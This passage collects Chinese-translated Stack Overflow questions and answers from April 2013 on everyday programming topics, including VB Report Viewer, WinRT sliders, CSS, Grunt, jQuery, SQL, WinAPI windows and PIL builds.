  def make_with_beef beef
    puts "Beef stew"
  end
end

class Casserole
  include Dish

  def make_with_chicken chicken
    puts "Chicken Pot Pie--or something"
  end

  def make_with_beef beef
    puts "Shepard's Pie"
  end
end

Sandwich.new.make(Chicken.new)
Stew.new.make(Chicken.new)
Casserole.new.make(Beef.new) 
```

# sql - VB中的过滤器/参数

> ID：15845755
> 
> 赞同：1
> 
> 时间：2013-04-06T00:42:32.370
> 
> 标签：sql, visual-studio-2010, sql-server-2005, report-viewer2010

我曾经在 Google 上搜索如何`Report Viewer`在 VB 中为参数制作参数，我得到了[这个](http://www.youtube.com/watch?v=0DtlVTGD0EI)。

因此，我按照有关如何操作的分步过程进行了操作。一切似乎都很好，但是在我对一个在我的`SQL` `Database`.

没有那个值（一个带有 MONEY DATA TYPE 的值），结果如下：

![结果](https://i.stack.imgur.com/msqBM.jpg)

但如果我把它加起来，这就是错误：

![在此处输入图像描述](https://i.stack.imgur.com/8oyJo.jpg)

这是我用于参数的代码：

![在此处输入图像描述](https://i.stack.imgur.com/r5SwV.jpg)

我也这样做了，所以我可以应用该参数来`PRINT`使用`Report Viewer`：

```
Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        printall.Show()
        printall.txtID.Text = txtID.Text
        printall.txtFname.Text = txtpFName.Text
        printall.txtLname.Text = txtPLname.Text
        printall.txtMI.Text = txtMI.Text
        printall.txtSex.Text = txtSex.Text
        printall.txtStatus.Text = txtStatus.Text
        printall.txtTelNo.Text = txtTel.Text
        printall.txtDocID.Text = txtPDoc.Text
        printall.txtStreetNo.Text = txtStreetNo.Text
        printall.txtStreetName.Text = txtStreetName.Text
        printall.txtProvince.Text = txtProvince.Text
        printall.txtCity.Text = txtCity.Text
        printall.txtBrgy.Text = txtBrgy.Text
        printall.txtFnameKIN.Text = txtFNameKIN.Text
        printall.txtLnameKIN.Text = txtLNameKIN.Text
        printall.txtmiKIN.Text = txtMIKIN.Text
        printall.txtRELATION.Text = txtRelationKIN.Text
        printall.txtTotalDue.Text = txtTotalDue.Text
    End Sub 
```

如何解决？如何将 TotalDue 添加到报表查看器？谁能帮我解决这个问题？

# c# - 如何将滑块值链接到文本块的 FontSize 并将该值存储在 ApplicationData 变量中

> ID：15845759
> 
> 赞同：0
> 
> 时间：2013-04-06T00:43:50.543
> 
> 标签：c#, windows-8, windows-runtime, slider, windows-store-apps

我希望你能帮助我解决我的问题。我有一个简单的地铁应用程序。一个名为 myTextBlock 的文本块被放置在 HomePageView 页面中。这是它的 xaml：

```
<TextBlock x:Name="myTextBlock" Text="Hello" HorizontalAlignment="Center" VerticalAlignment="Top" Style="{StaticResource timeStyle}" TextAlignment="Center" FontSize="300"  RenderTransformOrigin="0.5,0.5" Margin="11,55,3,0"  ManipulationMode="All"> 
```

这是后面 HomePageView 代码中的 LoadState：

```
 protected override void LoadState(Object navigationParameter, Dictionary<String, Object> pageState)
        {
            try
            {
                double? myTextBlockValue = (double?)ApplicationData.Current.LocalSettings.Values["myTextBlockSize"];
                if (myTextBlockValue != null)
                {
                    myTextBlock.FontSize = (double)myTextBlockValue;
                }
            }
            catch
            {

            }
        } 
```

我构建了一个名为 SettingsPage 的设置窗格（魅力栏 -> 设置 -> 设置），其中放置了一个名为 timeSlider 的滑块。这是它的 xaml：

```
<Slider x:Name="timeSlider" Width="257" Minimum="1" Maximum="600" Loaded="timeSlider_Loaded" ValueChanged="timeSlider_ValueChanged" /> 
```

这些是放置在 SettingsPage 代码隐藏中的滑块 Loaded 和 ValueChanged 方法：

```
 private void timeSlider_Loaded(object sender, RoutedEventArgs e)
        {
            var sliderIstance = sender as Slider;
            double? storedSize = (double?)ApplicationData.Current.LocalSettings.Values["myTextBlockSize"];
            if (storedSize != null && storedSize != 1)
                sliderIstance.Value = (double)storedSize;
            else
                sliderIstance.Value = 300;
        }

        private void timeSlider_ValueChanged(object sender, RangeBaseValueChangedEventArgs e)
        {
            var sliderIstance = sender as Slider;
            ApplicationData.Current.LocalSettings.Values["myTextBlockSize"] = sliderIstance.Value as double?;
            var _Frame = Window.Current.Content as Frame;
            _Frame.Navigate(_Frame.Content.GetType());
            _Frame.GoBack();
        } 
```

您可以在我的 skydrive 上下载完整的解决方案：[https ://skydrive.live.com/redir?resid=1B721133DC03E67C!7350](https://skydrive.live.com/redir?resid=1B721133DC03E67C!7350)

这样，我将 myTextBlock 的 fontsize 属性（在 HomePageView 页面中）链接到滑块的 value 属性（在 SettingsPage 页面中），因此用户可以在运行时更改此属性。此外，此属性存储在 myTextBlockSize ApplicationData 变量中，以在应用程序关闭和重新打开时保留其值。

解决方案有效，但问题是：当我进入设置窗格（charm bar -> settings -> settings）并通过滑块更改 textblock fontsize 属性时，然后我回到主页视图并重新打开设置窗格，fontsize 属性被重新初始化为其原始值，因此它不会保留以前的（用户选择的）值。你能修复我的代码吗？非常感谢您提前。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T09:36:13.477

`if (sliderIstance.Value != 1)`您必须在`timeSlider_ValueChanged`事件中添加一个条件

```
private void timeSlider_ValueChanged(object sender, RangeBaseValueChangedEventArgs e)
{
    var sliderIstance = sender as Slider;
    if (sliderIstance.Value != 1)
        ApplicationData.Current.LocalSettings.Values["myTextBlockSize"] = sliderIstance.Value as double?;
    var _Frame = Window.Current.Content as Frame;
    _Frame.Navigate(_Frame.Content.GetType());
    _Frame.GoBack();
} 
```

# html - 为什么我的内部 div 超越了容器 div？

> ID：15845761
> 
> 赞同：0
> 
> 时间：2013-04-06T00:43:55.897
> 
> 标签：html, css

当我缩放浏览器时，**日期**和**apa** div 超出了**容器**div。即使缩放，如何将**日期/apa div 保持在容器内？**抱歉问了简单的问题。只是一个初学者。

```
<!DOCTYPE html>
    <html>
    <head>
        <title></title>
        <link rel="stylesheet" type="text/css" href="testeffect.css"/>
    </head>

     <body>

        <div id="header">

            <div id="container">
                <div id="date">
                    <p>18 Jamadilawal 1434H<br> Saturday, 30th March 2013<br><p>
                </div>

                <div id="apa">
                <p>18 Jamadilawal 1434H<br> Saturday, 30th March 2013<br><p>
                </div>

            </div>

        </div>

    </body>
</html>

*{margin: 0 auto;}

#header{
    height: 50px;
    width: 100%;
    background-color: black;
}

p{
    font-family: Garamond;
    font-size: 18px;
    color: white;
}

#container{
 height: 50px;
 width: 800px;
 position: absolute;
 left: 20%
}

#apa{
    position: absolute;
    left: 200px;
    width: 200px;
    height: 50px;
    background-color: brown;
    left: 420px;
 }

#date{
    position: absolute;
    left: 200px;
    width: 200px;
    height: 50px;
    background-color: brown;
} 
```

[http://jsfiddle.net/zWpM9/](http://jsfiddle.net/zWpM9/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T01:01:25.370

大多数时候，绝对定位会导致这种情况。尽量不要使用绝对定位

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T01:21:09.043

```
#header{
    height: 50px;
    width: 100%;
    background-color: black;
} 
```

如果父级也未设置，则无法继承基于父级的宽度，请尝试

```
body {
    width: 100%;
} 
```

也摆脱它`* { margin: auto; }`，只将它添加到必须居中的东西中。

其他问题，您正在使用`#header { width: 100%; }`，然后`#content { width: 800px; }`这是一个坏主意。如果 header 小于 800px，content 会做什么？行为奇怪，出乎意料。所以，请不要这样做。用百分比或 NONE 指定所有（对于初学者来说会更容易）。

这是我的小提琴，猜测你可能想要做什么。它可以正确缩放缩放，并且不使用百分比。

[http://jsfiddle.net/QgH99/](http://jsfiddle.net/QgH99/)

# gruntjs - JSHint 错误记录在哪里？

> ID：15845763
> 
> 赞同：1
> 
> 时间：2013-04-06T00:44:08.900
> 
> 标签：gruntjs, jshint

我刚开始和 Grunt 混在一起。我有一个成功运行的基本实现，缩小了我的代码并运行了 JSHint。

它说 0 个文件 lint free，我收集到这意味着它正在检查的所有文件都有 lint。

但是，我已经在谷歌上搜索了一个小时，而且难以置信的是，无法弄清楚这些错误到底保存在哪里。

我需要在 grunt 配置中指定一个日志文件吗？我在 JSHint 或 grunt 文档中没有看到类似的内容。

下面的 Gruntfile 几乎直接取自 Grunt 的“入门”。我退出了 qunit，因为我目前没有任何测试 -

```
module.exports = function(grunt) {
  grunt.initConfig({

    pkg: grunt.file.readJSON('package.json'),

    concat: {
      options: {
        // define a string to put between each file in the concatenated output
        separator: ';'
      },
      dist: {
        // the files to concatenate
        src: ['spin/**/*.js'],
        // the location of the resulting JS file
        dest: 'dist/<%= pkg.name %>.js'
      }
    },

    uglify: {
      options: {
        // the banner is inserted at the top of the output
        banner: '/*! <%= pkg.name %> <%= grunt.template.today("dd-mm-yyyy") %> */\n'
      },
      dist: {
        files: {
          'dist/<%= pkg.name %>.min.js': ['<%= concat.dist.dest %>']
        }
      }
    },

    jshint: {
      // define the files to lint
      files: ['gruntfile.js', 'src/**/*.js', 'test/**/*.js'],
      // configure JSHint (documented at http://www.jshint.com/docs/)
      options: {
          // more options here if you want to override JSHint defaults
          "curly": true,
  "eqnull": true,
  "eqeqeq": true,
  "undef": true,
        globals: {
          jQuery: true,
          console: true,
          module: true
        }
      }
    },

    watch: {
      files: ['<%= jshint.files %>'],
      tasks: ['jshint']
    }

  });

      grunt.loadNpmTasks('grunt-contrib-uglify');
      grunt.loadNpmTasks('grunt-contrib-jshint');
      grunt.loadNpmTasks('grunt-contrib-watch');
      grunt.loadNpmTasks('grunt-contrib-concat');

      grunt.registerTask('test', ['jshint']);

      grunt.registerTask('default', ['jshint', 'concat', 'uglify']);

}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T15:36:46.630

0 个文件 lint free 并不意味着您有文件有错误，这意味着检查了零个文件！

jshint-task 将向您的控制台输出错误（包括文件、行号和列）

那就是您指定要检查的文件的地方：

```
files: ['gruntfile.js', 'src/**/*.js', 'test/**/*.js'], 
```

如果您将“gruntfile.js”更改为“Gruntfile.js”（区分大小写！），它应该检查您的 gruntfile（您当然已经拥有）。

# html - 滚动时如何将对象保持在固定位置？

> ID：15845764
> 
> 赞同：0
> 
> 时间：2013-04-06T00:44:10.090
> 
> 标签：html, css, css-position

我想让我的社交资料按钮像在 9gag 上一样滚动。一旦滚动到某个点，他们右侧的 2 个广告就会保持在固定位置。我也想这样做。有人可以帮我弄这个吗？

非常感谢你们。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:45:27.067

`position: fixed`一旦滚动偏移量达到某个点，您就可以添加到元素中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T01:27:07.043

定义此 CSS，然后将 id="media_icons" 添加到要修复的元素。根据您的需要更改样式。

```
#media_icons {
clear: both;
height: 34px;
margin-right: 33px;
margin-top: 32px;
position: fixed;
right: 0;
top: 0;
width: 148px;
} 
```

# sentry - Raven-js 错误没有在哨兵中获取“站点”属性，而 python raven 错误是？

> ID：15845765
> 
> 赞同：0
> 
> 时间：2013-04-06T00:44:14.273
> 
> 标签：sentry, raven

我有三个 python 客户端和一个连接到单个哨兵服务器的 javascript 客户端（所有 raven）。我`site`为每个客户准备了一套独特的产品。但是，虽然三个 python 客户端生成的错误已`site`在哨兵界面中正确设置，但 javascript 客户端生成的错误没有`site`设置。

我的 raven-js 设置（请原谅我的 Django）：

```
require(['lib/raven-1.0.7'], function(Raven){
  Raven.config('{% sentry_public_dsn %}', {
    // escapere is a custom tag, simply wraps python's re.escape
    includePaths: [new RegExp('{{ request.build_absolute_uri|escapere }}')],
    site: 'AJAX'
  }).install();
  Raven.setUser({
    email: "{{ user.email|escapejs }}",
    id: "{{ user.id|escapejs }}"
  });
}); 
```

我对哨兵代码做了一些挖掘（使用高度科学的 scatter-some-logging-statements-around 方法），我确信“site”参数确实被发送到哨兵 API，但由于某种原因，它在那里和创建实际事件组之间迷路了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-07T02:11:22.210

似乎哨兵正在远离`site`参数以支持标签。从 raven-js repo 升级到最新的 master 并更改

```
site: 'AJAX' 
```

到

```
tags: {site: 'AJAX'} 
```

使事情按预期运行。

# r - 使用 mapply 在 R/TraMineR 中创建序列对象？

> ID：15845767
> 
> 赞同：3
> 
> 时间：2013-04-06T00:44:30.993
> 
> 标签：r, traminer

我正在运行下面的代码来生成`TraMineR`序列对象列表。数据集可以在 [这里][1] 找到。

```
library(TraMineR)
sequences <- read.csv(file = "event-stream-20-l-m.csv", header = TRUE, nrows=10)
repo_names = colnames(sequences)

# 1\. Loop across and define the 24 sequence objects & store them in sequence_objects
colpicks <- seq(10,240,by=10)
sequence_objects <- mapply(function(start,stop) seqdef(sequences[,start:stop]),
                           colpicks - 9, colpicks) 
```

但是，如果我运行：

```
test <- sequence_objects[1]
seqdist(test, indel=1, with.missing=FALSE, norm="maxdist") 
```

我收到的错误信息是：

```
Error:  [!] data is not a state sequence object, use 'seqdef' function to create one 
```

*怎么*会`mapply`使用`seqdef`不创建序列对象列表？

 ** * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T03:53:14.787

`mapply`默认情况下简化返回值。

根据上一个问题中的评论，尝试`SIMPLIFY=FALSE`在`mapply`通话中加入。*

# c++ - 我应该怎么做才能让 WS_MAXIMIZE 工作？

> ID：15845768
> 
> 赞同：5
> 
> 时间：2013-04-06T00:44:32.613
> 
> 标签：c++, oop, winapi, wndproc

我的程序是这样开始的：

```
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nShowCmd)
    {
        MapEditor mapEditor;

        mapEditor.Run();

        return 0;
    } 
```

并且有 MapEditor()：

```
MapEditor::MapEditor()
{
    /* Creates the window */
    WNDCLASSEX wClass;
    ZeroMemory(&wClass,sizeof(WNDCLASSEX));
    wClass.cbSize=sizeof(WNDCLASSEX);
    wClass.style=CS_HREDRAW|CS_VREDRAW;
    wClass.lpfnWndProc=WinProc;
    wClass.cbClsExtra=NULL;
    wClass.cbWndExtra=NULL;
    wClass.hInstance=GetModuleHandle(0);
    wClass.hIcon=NULL;
    wClass.hCursor=LoadCursor(NULL,IDC_ARROW);
    wClass.hbrBackground=(HBRUSH)COLOR_WINDOW;
    wClass.lpszMenuName=NULL;
    wClass.lpszClassName="Map Editor";
    wClass.hIconSm=NULL;

    if(!RegisterClassEx(&wClass))
    {
        int nResult=GetLastError();

        MessageBox(NULL,"Failed to register window class","Window Class Failed",MB_ICONERROR);
    }

    ME_HWnd=CreateWindowEx(NULL,
            "Map Editor",
            "Map Editor",
            WS_OVERLAPPEDWINDOW | WS_MAXIMIZE | WS_VISIBLE,
            CW_USEDEFAULT,
            CW_USEDEFAULT,
            CW_USEDEFAULT,
            CW_USEDEFAULT,
            NULL,
            NULL,
            GetModuleHandle(0),
            this);

    if(!ME_HWnd)
    {
        int nResult=GetLastError();

        MessageBox(NULL,"Window class creation failed","Window Class Failed",MB_ICONERROR);
    }
    ShowWindow(ME_HWnd, WS_MAXIMIZE);
} 
```

窗口永远不会开始最大化。为什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-06T01:25:35.887

您将错误的第二个参数传递给`ShowWindow`. [如文档中所述](http://msdn.microsoft.com/en-us/library/windows/desktop/ms633548%28v=vs.85%29.aspx)，第二个参数应该是一个`SW_...`值，而不是一个`WS_...`值。

# mysql - MySQL 查询 - 2 个总和，加在一起

> ID：15845770
> 
> 赞同：0
> 
> 时间：2013-04-06T00:44:50.710
> 
> 标签：mysql, sql

我有一张这样的桌子（订单）：

```
id
sub_total
final_total
status_id
date_estimated 
```

我希望执行以下操作：每个带有 a 的订单`status_id = 65`，将他们`sub_total`的 s 相加。每个带有 的订单`status_id > 65`，将它们`final_total`的 s 相加。然后，将两个总和相加，然后返回这个新总和。

这可能在一个查询中吗？最初我有以下内容，但这并不能说明新`final_total`功能：

```
"SELECT SUM(sub_total) as total 
   FROM orders 
  WHERE month(date_estimated) = month(CURDATE() - INTERVAL 1 MONTH) 
    AND status_id = 65" 
```

不要介意此查询中的日期内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T01:07:24.543

```
SELECT SUM(sub_total) as total 
   FROM orders 
  WHERE month(date_estimated) = month(CURDATE() - INTERVAL 1 MONTH) 
    AND status_id = 65
UNION 
SELECT SUM(final_total) as total 
   FROM orders 
  WHERE month(date_estimated) = month(CURDATE() - INTERVAL 1 MONTH) 
    AND status_id > 65 
```

# flash - 如何从 AS3 脚本调用 C# 方法？

> ID：15845772
> 
> 赞同：0
> 
> 时间：2013-04-06T00:44:58.687
> 
> 标签：flash, unity3d

我有两个 swf 文件。第一个（我们称之为A）一个是一种带有登录UI等的宿主应用程序。第二个（B）是由Unity生成的。因此，A 在用户加载并启动 B 的一些操作之后。此时我可以轻松地从 A (C#) 调用 B (AS3) 方法并且它可以工作，但我不能从 B (AS3) 调用 A (C#) 方法. [官方文档页面](http://docs.unity3d.com/Documentation/Manual/flash-gettingstarted.html)上没有关于这个方向通信的任何信息。

所以，我试过[这种方式](http://forum.unity3d.com/threads/147415-Call-AS3-function-from-C-and-Call-C-function-from-AS3-maybe-helpful)，但它对我不起作用。所以我做了什么：

在 C#（项目 A）方面，我创建了 FlashCB.cs：

```
using UnityEngine;
using System.Collections;

[NotRenamed]
public class FlashCB {

    public static int Func() {
        Debug.Log("Unity function called with message. ");
        return 10;
    }
} 
```

在 AS3（项目 B）端 NetTest.as：

```
import global.FlashCB;
[...]
public function onLoadComplete( evt : Event ) : void
{
    [...]
    var res:int = FlashCB.Func();
} 
```

最后，它因以下错误而崩溃：

```
[Fault] exception, information=ReferenceError: Error #1065: Variable FlashCB is not defined. 
```

难道我做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T08:12:58.363

我不知道 Unity 是怎么回事，但我也制作了一个内置 Flash 的 C# 应用程序。我使用了这段代码，它工作正常：

AS3：

```
ExternalInterface.call('myfunction', >params<); 
```

C＃：

```
flashPlayer.FlashCall += new _IShockwaveFlashEvents_FlashCallEventHandler(flashPlayer_FlashCall); //this var is your Flash
private void flashPlayer_FlashCall(object sender, _IShockwaveFlashEvents_FlashCallEvent e)
{
    //your flash call handler here
} 
```

# css - display: none 页面加载后应用缓慢

> ID：15845777
> 
> 赞同：1
> 
> 时间：2013-04-06T00:45:34.197
> 
> 标签：css, fouc

我有一个隐藏错误消息的页面`display: none;`

页面加载时，错误消息会短暂显示然后消失。似乎 ccs 对页面的应用速度很慢。

如何改善用户体验并且在加载时不允许显示错误消息？

该页面还使用 Ajax 调用加载表。这会影响 css 如何应用于页面吗？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:50:58.123

只需添加`style="display:none;"`到页面上最初不想显示的实际 html 元素或 div 中。您不能立即依赖 CSS 文件。例如：

```
<div class="error" style="display:none;">
    <span class="myerror">Hello World!</span>
</div> 
```

除了隐藏区域的例外情况外，通常最好将所有 css 与页面和外部文件分离。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T00:55:01.250

如果您调用您的 CSS 文件，`<link>`那么您应该尝试将您的 CSS 放入其中`<style>`。应该更快。由于外部文件需要更长的时间来加载，然后`<style>`您在同一个文件中。

# python-2.7 - “命令‘gcc’失败，退出状态为 1”构建 PIL 1.1.7

> ID：15845785
> 
> 赞同：1
> 
> 时间：2013-04-06T00:47:20.957
> 
> 标签：python-2.7, python-imaging-library

我正在尝试构建 python-imaging 并收到此错误：

```
 gcc -pthread -fno-strict-aliasing -g -O2 -DNDEBUG -g -fwrapv -O3 -Wall -Wstrict-prototypes -fPIC -DHAVE_LIBJPEG -DHAVE_LIBZ -I/usr/local/include/freetype2 -IlibImaging -I/usr/local/include -I/usr/include/tcl8.5 -I/usr/include -I/usr/local/include/python2.7 -c libImaging/JpegDecode.c -o build/temp.linux-i686-2.7/libImaging/JpegDecode.o
    libImaging/JpegDecode.c: In function ‘fill_input_buffer’:
    libImaging/JpegDecode.c:55:12: error: ‘FALSE’ undeclared (first use in this function)
    libImaging/JpegDecode.c:55:12: note: each undeclared identifier is reported only  once for each function it appears in
    libImaging/JpegDecode.c: In function ‘ImagingJpegDecode’:
    libImaging/JpegDecode.c:163:45: error: ‘FALSE’ undeclared (first use in this function)
    libImaging/JpegDecode.c: In function ‘fill_input_buffer’:
    libImaging/JpegDecode.c:56:1: warning: control reaches end of non-void function [-Wreturn-type]
    error: command 'gcc' failed with exit status 1 
```

# sql - 需要帮忙！with - SQL Plus 选择多列

> ID：15845788
> 
> 赞同：0
> 
> 时间：2013-04-06T00:47:29.440
> 
> 标签：sql

嗨，我正在使用 sql plus，我需要从 4 个表中选择 5 列并显示结果。这是我使用的代码和我得到的错误。

```
SELECT CustomerID, OrderID, AircraftID, Quantity, TotalCost 
FROM Customer_Table, Order_Table, Aircraft_Table, Orderline; 
```

> 第 1 行出现错误：ORA-00918：列定义不明确

获取这些列并从多个表中显示它们的代码是什么。请帮助解决这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:56:41.720

原因是您尝试执行连接两个或多个表的 SQL 语句，其中两个表中都存在同名的列。

**以这个 SQL 查询为例**

```
SELECT suppliers.supplier_id, quantity
FROM suppliers, orders
WHERE suppliers.supplier_id = orders.supplier_id; 
```

由于供应商和订单表中都存在supplier_id 列，因此您需要在该列前面加上表名，如下所示：

此外，您需要在它们之间链接您的表格。如果我以上面的例子为例，你应该做这种事情

```
WHERE suppliers.supplier_id = orders.supplier_id; 
```

表示您将表格`suppliers`与`orders`按列链接的表格`supplier_id`

本文可能会帮助您了解您的问题： [http ://www.sitepoint.com/understanding-sql-joins-mysql-database/](http://www.sitepoint.com/understanding-sql-joins-mysql-database/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T00:53:36.590

我不知道 SQL plus，但在大多数 SQL 变体中，您应该指定一个表名，然后是一个列名。例如 SELECT Customer_Table.CustomerID ......这将消除结果投影中应该使用哪一列的歧义。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T00:55:26.203

该错误意味着这些表中存在一个或多个具有相同名称的列。这就是为什么它不知道从哪个表中选择哪一列。如果您可以指定表名然后指定列，我认为这应该消失。

# javascript - Jquery a .click 然后 .slideDown div

> ID：15845792
> 
> 赞同：2
> 
> 时间：2013-04-06T00:47:41.637
> 
> 标签：javascript, jquery, html, dom

我有一个锚点，当你点击它时，它会在 div 中向下滑动一个表单，然后再次点击它会将它向上滑动。最初我只是使用 .toggle，但现在我有多个锚点和多个具有相同类的 div，所以我必须重新编写代码，否则无论何时单击任何锚点，所有 div 都会向下滑动，你会看到 4 个表单。

所以，我想我可以用 .closest 重写代码，但它似乎不起作用。我认为这是因为 .closest 必须在 DOM 层次结构中上升，所以它对我的 div 的布局方式不起作用。我试过 .sibling 但这也不起作用。有任何想法吗？

```
 <a href="#" class="payment-form-show">Pre-Pay with Credit Card</a>
  <div style="display: none;" class="payment-form-wrapper">
      <h3><?php _e('Submit a Payment', 'jc_stripe'); ?></h3>
      <form action="" method="POST" id="stripe-payment-form" class="payment-form">
        ...
      </form>
  </div>

  <script>
        $("a.payment-form-show").click(function() {
            var e = $(this).closest("div.payment-form-wrapper");
                    if (e.is(":hidden")) {
                        e.slideDown("slow");
                        $(this).html("Don't Pre-Pay with Credit Card")
                    } else {
                        e.slideUp("slow");
                        $(this).html("Pre-Pay with Credit Card")
                    }
            return false;
        });
    </script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T02:11:08.480

我认为您应该将 a.payment-form-show 和 div.payment-form-wrapper 包装在 div 中。像这样：

```
<div>
<a href="#" class="payment-form-show">Pre-Pay with Credit Card</a>
  <div style="display: none;" class="payment-form-wrapper">
      <h3><?php _e('Submit a Payment', 'jc_stripe'); ?></h3>
      <form action="" method="POST" id="stripe-payment-form" class="payment-form">
        ...
      </form>
  </div>
</div> 
```

*   单击 a 标签时，您会查找直接父级，然后找到表单：

    $(this).parent().find("div.payment-form-wrapper");

*   在这种情况下， div 包装器充当标签的上下文。这将创建一个更易于维护的代码。因为当您使用 .next() 或某些函数查找 .div.payment-form-wrapper 时，您的 javascript 代码会与标签的当前位置耦合。将来，如果您修改位置，或在两者之间添加一些标签，您的代码将失败。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T01:06:19.177

用这个...

```
$(".payment-form-show").on('click', function() {
    $('.payment-form-wrapper').slideToggle('slow');
    if($('.payment-form-wrapper').is('visible')){
        $(this).html("Pre-Pay with Credit Card");
    }else{
        $(this).html("Don't Pre-Pay with Credit Card");
    }
}); 
```

看**[DEMO](http://jsfiddle.net/8b5q5/)**

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T03:54:43.470

即使所有 div 具有相同的类，此代码也应该可以工作。看看这个：

```
$(".payment-form-show").on('click', function() {
    var slider = $(this).closest("a").next();

    slider.slideToggle("slow");    
    slider.is(":visible") ? $(this).html("Pre-Pay with Credit Card") : $(this).html("Don't Pre-Pay with Credit Card");
}); 
```

小提琴基于 MG_Bautista 的小提琴：http: [//jsfiddle.net/8b5q5/1/](http://jsfiddle.net/8b5q5/1/)

# paypal - 如何使用新的 Paypal 沙盒从网站测试 IPN？

> ID：15845794
> 
> 赞同：0
> 
> 时间：2013-04-06T00:47:43.803
> 
> 标签：paypal, simulation, sandbox, paypal-ipn

我曾经使用旧的 PayPal 沙箱来模拟使用 IPN 的付款（发布付款，然后确认 IPN）。这在经典沙箱中可以正常工作。

随着新沙盒的引入 - 我尝试像以前一样提交请求（将用户重定向到[https://www.sandbox.paypal.com/cgi-bin/webscr?](https://www.sandbox.paypal.com/cgi-bin/webscr?)），这应该将用户带到付款页面 - 但此链接现在将用户带到沙盒的登录页面。这不再支持了吗？

我看到仍然有一个 IPN 模拟器，但我想从用户的角度测试端到端的往返过程。这似乎不再可能了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:11:41.833

在打开 developer.paypal.com 网站并登录之前，请尝试清除缓存和 cookie。如果您使用的是 Internet Explorer，请尝试使用 Firefox 或 Chrome。

# jquery - 使用jquery从段落中删除div

> ID：15845799
> 
> 赞同：0
> 
> 时间：2013-04-06T00:48:19.767
> 
> 标签：jquery

我有以下问题：

我有 ：

```
<p class="site_text"><div>Some text</div></p> 
```

我正在尝试删除 div 标签并保持文本完整，并且我有以下代码

```
$('p.site_text').remove('<div>');
$('p.site_text').remove('</div>'); 
```

这不会从段落中删除 div 。任何人都可以帮忙吗？

问候，佐兰

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:56:03.933

您不能将 a`div`放在`p`标签内，它既违反了 html 规则，也不能在 Chrome 中使用。如果将 替换为`p`，`div`则可以使用以下代码：
JSFiddle: [http://jsfiddle.net/aX3Hp/1/](http://jsfiddle.net/aX3Hp/1/)
JS:

```
$('div.site_text div').wrapInner('<span/>').children().unwrap(); 
```

HTML：

```
<div class="site_text"><div>Some text</div></div> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T00:57:35.283

## jQuery 替换（）

```
<p class="site_text">
    <!-- add some inline styles so we can see when div is removed -->
    <div style='color:red'>Some text</div>
    <div style='color:blue'>Another div</div>
</p>

$("div").each(function(){
   var obj = $(this);
   obj.replaceWith(obj.html());
}); 
```

*   演示： http: [//jsfiddle.net/s5CUF/2/](http://jsfiddle.net/s5CUF/2/)（IE10、FF 20、Chrome 26）
*   见：[http ://api.jquery.com/replaceWith/](http://api.jquery.com/replaceWith/)

## 有效性

但是，正如 kpsuperplane 指出的那样，起始 HTML 无效。运行此脚本后它将有效，**但**分层 jQuery 选择器将无法按预期工作（尝试一下），因为浏览器会尝试更正标记。

浏览器将您的结构解释得更像：

```
<p class="site_text"></p>
<div style='color:red'>Some text</div>
<div style='color:blue'>Another div</div>
<p></p> 
```

只要您注意无效结构的选择器后果，`replaceWith()`即使使用无效标记也能正常工作。

## 使用更严格的选择器

很有可能，您不想删除网站上的所有内容`divs`，但不能使用`p`来限定选择器，因为浏览器认为.`div``p`

但是，您可以使用`p`的父级来限定选择器。

```
<!-- actual -->
<div id="searchresults">
    <p class="site_text">
        <div>Some text</div>
        <div>Another div</div>
    </p>
</div>

<!-- how the browser interprets -->
<div id="searchresults">
    <p class="site_text"></p>
    <div>Some text</div>
    <div>Another div</div>
    <p></p>
</div>

// a more restrictive selector
var divs = $("#searchresults > div"); 
```

*   [使用外包装的示例](http://jsfiddle.net/s5CUF/4/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T01:00:58.910

尽管您的 html 无效，但您仍然可以在类似的有效场景中使用：

```
$("p.site_text").each(function() {
  $(this).html($(this).children(":first").html()); 
```

});

# windows - 如何将 example.com 重定向到 127.0.0.0/main/test？

> ID：15845801
> 
> 赞同：0
> 
> 时间：2013-04-06T00:48:38.143
> 
> 标签：windows, wamp

我正在使用 wamp 5，Windows XP。我已经在我的本地磁盘中编辑了我的主机文件，如下面的代码，它可以工作

> 127.0.0.0 example.com

但我想重定向到一个特定的文件夹，如果我把它改成下面的代码，它就不起作用

> 127.0.0.0/main/site example.com

如何在我的 PC 中重定向`example.com`到`127.0.0.0/main/site`本地？

顺便说一句，我不想​​安装任何新软件来解决这个问题

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-27T00:48:21.423

您需要创建一个虚拟主机

将 HOST 文件保留为 127.0.0.1 example.com

当您定义一个虚拟主机时，您还告诉它哪个文件夹是它的 DocumentRoot，这样当您在浏览器中使用地址 example.com 时，它将把它发送到正确的位置。

查看[wampserver.com](http://forum.wampserver.com/read.php?2,113686,113701#msg-113701)

# ruby - ruby 应用程序在 heroku 上崩溃：错误 R10（启动超时）-> Web 进程在启动后 60 秒内无法绑定到 $PORT

> ID：15845803
> 
> 赞同：2
> 
